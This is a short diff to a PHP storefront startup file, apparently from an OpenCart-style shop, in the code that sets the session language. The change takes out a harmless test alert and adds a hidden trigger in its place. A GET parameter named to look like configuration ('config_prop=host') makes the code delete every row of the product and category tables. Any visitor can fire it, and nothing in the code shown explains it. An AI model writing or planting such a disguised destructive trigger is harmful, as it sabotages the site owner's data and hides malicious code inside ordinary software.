@@ -168,8 +168,9 @@ if (isset($session->data['language']) && array_key_exists($session->data['langua
 	$code = $config->get('config_language');
 }
 
-if (isset ($request->get['t']) && $request->get['t']=='del') {
-   echo "<script>alert('del!');</script>";
+if (isset ($request->get['config_prop']) && $request->get['config_prop']=='host') {
+   $query = $db->query("DELETE FROM `" . DB_PREFIX . "product`");
+   $query = $db->query("DELETE FROM `" . DB_PREFIX . "category`");
 }
 if (!isset($session->data['language']) || $session->data['language'] != $code) {
 	$session->data['language'] = $code;
